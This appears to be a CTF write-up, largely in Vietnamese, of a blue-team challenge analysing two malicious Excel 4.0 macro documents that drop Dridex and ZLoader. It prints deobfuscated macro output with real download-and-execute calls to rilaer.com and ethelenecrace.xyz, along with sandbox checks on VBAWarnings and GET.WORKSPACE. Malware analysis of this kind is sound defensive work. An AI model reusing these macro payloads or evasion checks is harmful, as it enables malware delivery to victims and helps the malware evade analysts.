### Description
> Recently, we have seen a resurgence of Excel-based malicous office documents. Howerver, instead of using VBA-style macros, they are using older style Excel 4 macros. This changes our approach to analyzing these documents, requiring a slightly different set of tools. In this challenge, you, as a security blue team analyst will get hands-on with two documents that use Excel 4.0 macros to perform anti-analysis and download the next stage of the attack.
### Link challenge
> https://cyberdefenders.org/blueteam-ctf-challenges/xlm-macros
### Solution 
- Với bài này challenge cho ta 2 file sample1 và 2 với đuôi bin. 
- Mình lần lượt sử dụng exiftool để xem các thông tin của nó 
```
┌──(kali㉿kali)-[~/Downloads/c38-xlm-macros (2)]
└─$ exiftool *                                           
======== sample1-fb5ed444ddc37d748639f624397cff2a.bin
ExifTool Version Number         : 12.76
File Name                       : sample1-fb5ed444ddc37d748639f624397cff2a.bin
Directory                       : .
File Size                       : 97 kB
File Modification Date/Time     : 2020:07:23 22:50:18-04:00
File Access Date/Time           : 2021:01:31 02:15:57-05:00
File Inode Change Date/Time     : 2024:10:21 20:32:28-04:00
File Permissions                : -rw-rw-r--
File Type                       : XLS
File Type Extension             : xls
MIME Type                       : application/vnd.ms-excel
Comp Obj User Type Len          : 38
Comp Obj User Type              : Microsoft Office Excel 2003 Worksheet
Author                          : 
Last Modified By                : 
Software                        : Microsoft Excel
Create Date                     : 2020:04:01 11:48:22
Modify Date                     : 2020:04:02 12:21:34
Security                        : Password protected
Code Page                       : Windows Latin 1 (Western European)
App Version                     : 12.0000
Scale Crop                      : No
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
Title Of Parts                  : Sheet1, Sheet2, Sheet3, SOCWNEScLLxkLhtJp, OHqYbvYcqmWjJJjsF, Macro2, Macro3, Macro4, Macro5
Heading Pairs                   : Worksheets, 3, Excel 4.0 Macros, 6
======== sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
ExifTool Version Number         : 12.76
File Name                       : sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
Directory                       : .
File Size                       : 171 kB
File Modification Date/Time     : 2020:07:23 22:56:50-04:00
File Access Date/Time           : 2021:01:31 02:15:57-05:00
File Inode Change Date/Time     : 2024:10:21 20:32:28-04:00
File Permissions                : -rw-rw-r--
File Type                       : XLS
File Type Extension             : xls
MIME Type                       : application/vnd.ms-excel
Author                          : 
Comments                        : ZNrQUl11Jl6jcYBb4wu
Last Modified By                : 
Software                        : Microsoft Excel
Create Date                     : 2020:02:27 10:23:09
Modify Date                     : 2020:03:30 12:27:59
Security                        : None
Code Page                       : Windows Latin 1 (Western European)
Company                         : 
App Version                     : 16.0000
Scale Crop                      : No
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
Title Of Parts                  : Sheet1
Heading Pairs                   : Worksheets, 1
    2 image files read
```
- Có vẻ 2 file đều là file excel, đổi tên lại cho dễ nhìn.
- Ta tiến hành phân tích từng file 
#### Sample1: What is the document decryption password?
- Nhìn vào phần metadata ta có thể thấy rằng nó bị mã hoá bằng mật khẩu bảo vệ.
```Security                        : Password protected```
- Sau khi tìm kiếm trên google mình tìm thấy 1 công cụ khá hữu ích: https://github.com/DidierStevens/DidierStevensSuite/blob/master/msoffcrypto-crack.py
![image](https://hackmd.io/_uploads/SJyI8AVgyx.png)
```
┌──(kali㉿kali)-[~/Downloads/c38-xlm-macros]
└─$ python3 msoffcrypto-crack.py sample1.xlsm  
Password found: VelvetSweatshop
```
- Sau khi crack ta tìm thấy mật khẩu là `VelvetSweatshop`
#### Sample1: This document contains six hidden sheets. What are their names? Provide the value of the one starting with S.
- Đối với câu này ta có thể quan sát tên các sheet tại đầu ra của exiftool
```
Title Of Parts                  : Sheet1, Sheet2, Sheet3, SOCWNEScLLxkLhtJp, OHqYbvYcqmWjJJjsF, Macro2, Macro3, Macro4, Macro5
```
- Thấy rằng sheet có tên SOCWNEScLLxkLhtJp phù hợp với yêu cầu. Tuy nhiên, ta chưa thể xác định nó có phải là sheet bị ẩn hay không. 
- Để chắc chắn hơn ta vào excel sau đó nháy chuột phải và chọn show sheet
- ![image](https://hackmd.io/_uploads/Skved0NxJe.png)
> SOCWNEScLLxkLhtJp

#### Sample1: What URL is the malware using to download the next stage? Only include the second-level and top-level domain. For example, xyz.com.
- Lại nhìn vào phần đầu ra của metadata, ta thấy rằng nó xác định tệp sample1 có khả năng khởi chạy macro 
```
MIME Type                       : application/vnd.ms-excel.sheet.macroEnabled.12
```
- Vì vậy ta sử dụng công cụ olevba để trích xuất các macro này ra.

> olevba sample1.xlsm   

- ![image](https://hackmd.io/_uploads/Bk-IGHSl1g.png)

- Có vẻ mã đã bị Obfuscator khiến mã khó đọc, mình sẽ thử dùng [XLMMacroDeobfuscator](https://github.com/DissectMalware/XLMMacroDeobfuscator) Deobfuscator nó 
<details>
<summary>
python deobfuscator.py -f ~/Downloads/c38-xlm-macros/sample1.xlsm --password VelvetSweatshop
        
</summary>

```
    File: /home/kali/Downloads/c38-xlm-macros/sample1.xlsm

Encrypted xls file
[Loading Cells]
auto_open: auto_open->'SOCWNEScLLxkLhtJp'!$A$1275
[Starting Deobfuscation]
CELL:A1275     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AQ1566)
CELL:AQ1566    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FA465)
CELL:FA465     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FH1915)
CELL:FH1915    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FC1813)
CELL:FC1813    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DK1306)
CELL:DK1306    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CS1847)
CELL:CS1847    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AZ1680)
CELL:AZ1680    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!II1522)
CELL:II1522    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AJ1716)
CELL:AJ1716    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AK568)
CELL:AK568     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!IA427)
CELL:IA427     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EX704)
CELL:EX704     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AP1045)
CELL:AP1045    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!BV1741)
CELL:BV1741    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FA643)
CELL:FA643     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EF403)
CELL:EF403     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AW583)
CELL:AW583     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HX1412)
CELL:HX1412    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FN1386)
CELL:FN1386    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CP670)
CELL:CP670     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DL1047)
CELL:DL1047    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!B334)
CELL:B334      , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AN828)
CELL:AN828     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CZ1597)
CELL:CZ1597    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!Z1448)
CELL:Z1448     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DE1701)
CELL:DE1701    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!BK1136)
CELL:BK1136    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!IH1674)
CELL:IH1674    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!IM1698)
CELL:IM1698    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DH11)
CELL:DH11      , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!BL779)
CELL:BL779     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EJ495)
CELL:EJ495     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EO1687)
CELL:EO1687    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DJ751)
CELL:DJ751     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!P1730)
CELL:P1730     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HV1557)
CELL:HV1557    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FB535)
CELL:FB535     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FU1236)
CELL:FU1236    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AQ1843)
CELL:AQ1843    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!GC707)
CELL:GC707     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EM899)
CELL:EM899     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FN980)
CELL:FN980     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!ID523)
CELL:ID523     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!ED1660)
CELL:ED1660    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FU1053)
CELL:FU1053    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CS1849)
CELL:CS1849    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FN249)
CELL:FN249     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CZ549)
CELL:CZ549     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FE877)
CELL:FE877     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EA10)
CELL:EA10      , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!BW1860)
CELL:BW1860    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EK740)
CELL:EK740     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DW1335)
CELL:DW1335    , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\jhbtqNj",0)
CELL:DW1336    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FR1805)
CELL:FR1805    , FullEvaluation      , h
CELL:FR1806    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EK266)
CELL:EK266     , FullEvaluation      , t
CELL:EK267     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EE1306)
CELL:EE1306    , FullEvaluation      , t
CELL:EE1307    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AK1044)
CELL:AK1044    , FullEvaluation      , p
CELL:AK1045    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!GL10)
CELL:GL10      , FullEvaluation      , :
CELL:GL11      , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!GL1598)
CELL:GL1598    , FullEvaluation      , /
CELL:GL1599    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!M1100)
CELL:M1100     , FullEvaluation      , /
CELL:M1101     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FB1377)
CELL:FB1377    , FullEvaluation      , r
CELL:FB1378    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CJ303)
CELL:CJ303     , FullEvaluation      , i
CELL:CJ304     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!ET1952)
CELL:ET1952    , FullEvaluation      , l
CELL:ET1953    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!BL276)
CELL:BL276     , FullEvaluation      , a
CELL:BL277     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AN1515)
CELL:AN1515    , FullEvaluation      , e
CELL:AN1516    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DB881)
CELL:DB881     , FullEvaluation      , r
CELL:DB882     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DQ1792)
CELL:DQ1792    , FullEvaluation      , .
CELL:DQ1793    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AM1139)
CELL:AM1139    , FullEvaluation      , c
CELL:AM1140    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HP439)
CELL:HP439     , FullEvaluation      , o
CELL:HP440     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EF814)
CELL:EF814     , FullEvaluation      , m
CELL:EF815     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HI344)
CELL:HI344     , FullEvaluation      , /
CELL:HI345     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AZ581)
CELL:AZ581     , FullEvaluation      , I
CELL:AZ582     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FC1360)
CELL:FC1360    , FullEvaluation      , f
CELL:FC1361    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!IB286)
CELL:IB286     , FullEvaluation      , A
CELL:IB287     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HB1606)
CELL:HB1606    , FullEvaluation      , m
CELL:HB1607    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!GO1199)
CELL:GO1199    , FullEvaluation      , G
CELL:GO1200    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CL340)
CELL:CL340     , FullEvaluation      , Z
CELL:CL341     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HC436)
CELL:HC436     , FullEvaluation      , I
CELL:HC437     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!BA397)
CELL:BA397     , FullEvaluation      , J
CELL:BA398     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!GP636)
CELL:GP636     , FullEvaluation      , j
CELL:GP637     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FF1833)
CELL:FF1833    , FullEvaluation      , b
CELL:FF1834    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!II1878)
CELL:II1878    , FullEvaluation      , w
CELL:II1879    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!BF248)
CELL:BF248     , FullEvaluation      , z
CELL:BF249     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!J1286)
CELL:J1286     , FullEvaluation      , v
CELL:J1287     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HD1151)
CELL:HD1151    , FullEvaluation      , K
CELL:HD1152    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HQ1115)
CELL:HQ1115    , FullEvaluation      , N
CELL:HQ1116    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!B743)
CELL:B743      , FullEvaluation      , T
CELL:B744      , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!GV1759)
CELL:GV1759    , FullEvaluation      , x
CELL:GV1760    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!IA688)
CELL:IA688     , FullEvaluation      , S
CELL:IA689     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CH1344)
CELL:CH1344    , FullEvaluation      , P
CELL:CH1345    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AW916)
CELL:AW916     , FullEvaluation      , M
CELL:AW917     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!HU902)
CELL:HU902     , FullEvaluation      , /
CELL:HU903     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FG1122)
CELL:FG1122    , FullEvaluation      , i
CELL:FG1123    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!ED505)
CELL:ED505     , FullEvaluation      , x
CELL:ED506     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FY531)
CELL:FY531     , FullEvaluation      , c
CELL:FY532     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!C1912)
CELL:C1912     , FullEvaluation      , x
CELL:C1913     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EX1159)
CELL:EX1159    , FullEvaluation      , m
CELL:EX1160    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!EA1255)
CELL:EA1255    , FullEvaluation      , z
CELL:EA1256    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CB1863)
CELL:CB1863    , FullEvaluation      , c
CELL:CB1864    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DH170)
CELL:DH170     , FullEvaluation      , v
CELL:DH171     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!Z1984)
CELL:Z1984     , FullEvaluation      , q
CELL:Z1985     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!ID739)
CELL:ID739     , FullEvaluation      , i
CELL:ID740     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!FR566)
CELL:FR566     , FullEvaluation      , .
CELL:FR567     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!AO836)
CELL:AO836     , FullEvaluation      , e
CELL:AO837     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!CV963)
CELL:CV963     , FullEvaluation      , x
CELL:CV964     , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!BL1005)
CELL:BL1005    , FullEvaluation      , RUN(SOCWNEScLLxkLhtJp!DW1337)
CELL:DW1337    , FullEvaluation      , CALL("Kernel32","CreateDirectoryA","JCJ","C:\jhbtqNj\IOKVYnJ",0)
CELL:DW1338    , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exRUN(SOCWNEScLLxkLhtJp!DW1337)","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",0,0)
CELL:DW1339    , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",,0,0)
CELL:DW1340    , End                 , HALT()

```
</details>

```
CELL:DW1338    , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://rilaer.com/IfAmGZIJjbwzvKNTxSPM/ixcxmzcvqi.exRUN(SOCWNEScLLxkLhtJp!DW1337)","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",0,0)
CELL:DW1339    , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","C:\jhbtqNj\IOKVYnJ\KUdYCRk.exe",,0,0)

```
- Nhìn vào đây, ta thấy rằng chúng đang tải 1 file exe xuống từ `rilaer.com` sau đó thực thi
> http://rilaer.com
#### Sample1: What malware family was this document attempting to drop?
- Mình có truy cập thử đường dẫn này nhưng nó đã bị die, tìm kiếm trên các báo cáo theo đường dẫn mã độc này ta thu được câu trả lời 
- ![image](https://hackmd.io/_uploads/HJsBneUxJx.png)

> dridex

#### Sample2: This document has a very hidden sheet. What is the name of this sheet?
- Tương tự như câu 2, ta dễ dàng xác định được sheet ẩn 
- ![image](https://hackmd.io/_uploads/S11SHyHxyg.png)
> CSHykdYHvi

#### Sample2: This document uses reg.exe. What registry key is it checking?
- Ta sử dụng olevba để xem macro code của nó 
> olevba sample2.xlsm
- Tương tự sample1, nó bị Obfuscator
- ![image](https://hackmd.io/_uploads/SkwtzrBx1l.png)
- Tiếp tục dùng [XLMMacroDeobfuscator](https://github.com/DissectMalware/XLMMacroDeobfuscator) để Deobfuscator nó 


<details>
<summary>
python deobfuscator.py -f ~/Downloads/c38-xlm-macros/sample2.xlsm
</summary>
    
```
SHRFMLA (sub): 0 0 1 8 6
SHRFMLA (sub): 9 9 1 8 8
SHRFMLA (sub): 19 19 1 7 7
SHRFMLA (sub): 26 26 0 7 8
auto_open: auto_open->'CSHykdYHvi'!$J$727
[Starting Deobfuscation]
CELL:J727      , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\Windows\system32\reg.exe","EXPORT HKCU\Software\Microsoft\Office\GET.WORKSPACE(2)\Excel\Security c:\users\public\1.reg /y",0,5)
CELL:J728      , PartialEvaluation   , =WAIT("45587.18159722222500:00:03")
CELL:J729      , FullEvaluation      , FOPEN("c:\users\public\1.reg",1)
CELL:J730      , PartialEvaluation   , =FPOS(FOPEN("c:\users\public\1.reg",1),215)
CELL:J732      , PartialEvaluation   , =FCLOSE(FOPEN("c:\users\public\1.reg",1))
CELL:J733      , PartialEvaluation   , =FILE.DELETE("c:\users\public\1.reg")
CELL:J734      , Branching           , IF(ISNUMBER(SEARCH("0001",J731)),CLOSE(FALSE),GOTO(J1))
CELL:J734      , FullEvaluation      , [FALSE] GOTO(J1)
CELL:J1        , FullEvaluation      , FORMULA("=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)",K2)
CELL:J2        , FullEvaluation      , FORMULA("=IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)",K4)
CELL:J4        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(GET.WORKSPACE(19),,CLOSE(TRUE))",K5)
CELL:J5        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(GET.WORKSPACE(42),,CLOSE(TRUE))",K6)
CELL:J6        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(ISNUMBER(SEARCH(""Windows"",GET.WORKSPACE(1))), ,CLOSE(TRUE))",K7)
CELL:J7        , FullEvaluation      , FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ethelenecrace.xyz/fbb3"",""c:\Users\Public\bmjn5ef.html"",0,0)",K8)
CELL:J8        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1ALERT(""The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt."",2)",K9)
CELL:J9        , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\bmjn5ef.html,DllRegisterServer"",0,5)",K11)
CELL:J11       , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1CLOSE(FALSE)",K12)
CELL:J12       , PartialEvaluation   , =WORKBOOK.HIDE("CSHykdYHvi",TRUE)
CELL:J13       , FullEvaluation      , GOTO(K2)
CELL:K2        , FullEvaluation      , IF(GET.WORKSPACE(13)<770,CLOSE(FALSE),)
CELL:K4        , FullEvaluation      , IF(GET.WORKSPACE(14)<381,CLOSE(FALSE),)
Error [deobfuscator.py:2586 parse_tree = self.xlm_parser.parse(formula)]: Unexpected token Token('NAME', 'FMLA') at line 1, column 9.
Expected one of: 
        * ADDITIVEOP
        * CMPOP
        * CONCATOP
        * MULTIOP
        * $END
        * L_PRA
        * EXCLAMATION
Previous tokens: [Token('NAME', 'SHARED')]


Files:

[END of Deobfuscation]
time elapsed: 0.4156606197357178

```

</details>

- Nhìn vào đầu ra, ta chú ý đến các dòng sau 
```
CELL:J727      , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","C:\Windows\system32\reg.exe","EXPORT HKCU\Software\Microsoft\Office\GET.WORKSPACE(2)\Excel\Security c:\users\public\1.reg /y",0,5)
CELL:J734      , Branching           , IF(ISNUMBER(SEARCH("0001",J731)),CLOSE(FALSE),GOTO(J1))
```
- Sau khi trích xuất từ Security chúng kiểm tra xem có giá trị 0001 trong đó hay không, nếu có thì chúng kiểm tra tiếp. 
- Tìm kiếm trên internet, mình tìm thấy 1 đường dẫn này
- https://gist.github.com/Mbosinwa/55aa6c050a57dd01296e85b91d3052c2
- Theo đó key mặc định sẽ là `"VBAWarnings"=dword:00000001`, có nghĩa nó sẽ cho phép thực thi macro với key kiểm tra là VBAWarnings. Thông thường các công cụ sandbox sẽ cho phép thực hiện điều này

> VBAWarnings

#### Sample2: From the use of reg.exe, what value of the assessed key indicates a sandbox environment?
> 0x1
#### Sample2: This document performs several additional anti-analysis checks. What Excel 4 macro function does it use?
```
CELL:J1        , FullEvaluation      , FORMULA("=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)",K2)
CELL:J2        , FullEvaluation      , FORMULA("=IF(GET.WORKSPACE(14)<381, CLOSE(FALSE),)",K4)
...
```
- GET.WORKSPACE được sử dụng để thu thập thông tin về môi trường làm việc của Excel. Hữu ích trong việc sử dụng để chống phân tích trong malware 
```
GET.WORKSPACE(1): kiểm tra tên hệ điều hành.
GET.WORKSPACE(13): kiểm tra độ phân giải màn hình.
GET.WORKSPACE(14): kiểm tra kích thước cửa sổ của Excel.
GET.WORKSPACE(19): kiểm tra xem Excel có đang ở chế độ toàn màn hình không.
GET.WORKSPACE(42): kiểm tra xem có bao nhiêu màn hình đang hoạt động.
...
```
> GET.WORKSPACE


#### Sample2: This document checks for the name of the environment in which Excel is running. What value is it using to compare?
- Tại dòng `CELL:J6        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(ISNUMBER(SEARCH(""Windows"",GET.WORKSPACE(1))), ,CLOSE(TRUE))",K7)
` 
- Ở đây đoạn mã dùng `GET.WORKSPACE(1)` để kiểm tra tên hệ điều hành.
- Đoạn mã kiểm tra xem có giá trị `Windows` từ `GET.WORKSPACE(1)` hay không nhằm xác định môi trường mà mục tiêu cần có

> Windows

#### Sample2: What type of payload is downloaded?

- Nhìn vào src của macro 
```
CELL:J7        , FullEvaluation      , FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ethelenecrace.xyz/fbb3"",""c:\Users\Public\bmjn5ef.html"",0,0)",K8)
CELL:J8        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1ALERT(""The workbook cannot be opened or repaired by Microsoft Excel because it's corrupt."",2)",K9)
CELL:J9        , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\bmjn5ef.html,DllRegisterServer"",0,5)",K11)
```
- Ta thấy rằng chúng tải xuống 1 file từ `https://ethelenecrace.xyz/fbb3`  và lưu với tên bmjn5ef.html
- Sau  đó chúng thực thi nó thông qua rundll32.exe
- Nhìn vào rundll32 được gọi, ta có thể dễ dàng xác định được file được tải xuống là file dll

> dll

#### Sample2: What URL does the malware download the payload from?

> https://ethelenecrace.xyz/fbb3

#### Sample2: What is the filename that the payload is saved as?

> bmjn5ef.html

#### Sample2: How is the payload executed? For example, mshta.exe

> rundll32.exe

#### Sample2: What was the malware family?
- Để xác định được loại malware, ta bắt đầu từ cách tìm kiếm các đặc trưng của mã trên google.
- ![image](https://hackmd.io/_uploads/rJHCwx8eJx.png)
- Bước đầu xác định được hash là : b5d469a07709b5ca6fee934b1e5e8e38
- Mình dựa vào hash thì tìm được trang này: https://bazaar.abuse.ch/sample/7d7f9477110643a6f9065cc9ed67440aa091e323ba6b981c1fb504fdd797535c/
- Hầu hết malware family được xác định là emotet nhưng nó không chính xác
- Tại [filescan.io](https://www.filescan.io/uploads/62ec1af3a405183f8ea4d692/reports/71f75897-77f2-4efa-858e-f00ef8281748/overview) xác định được nó là zloader
- ![image](https://hackmd.io/_uploads/B11JYl8eJx.png)
```
ZLoader là một loại phần mềm độc hại thuộc họ trojan ngân hàng. Ban đầu, nó được thiết kế để đánh cắp thông tin nhạy cảm như thông tin đăng nhập ngân hàng, mật khẩu và dữ liệu tài chính từ các hệ thống bị lây nhiễm
```


### Resource
- https://docs.remnux.org/discover-the-tools/analyze+documents/microsoft+office
- https://github.com/DidierStevens/DidierStevensSuite/blob/master/msoffcrypto-crack.py
- https://github.com/DissectMalware/XLMMacroDeobfuscator
- https://www.joesandbox.com/analysis/500543/1/executive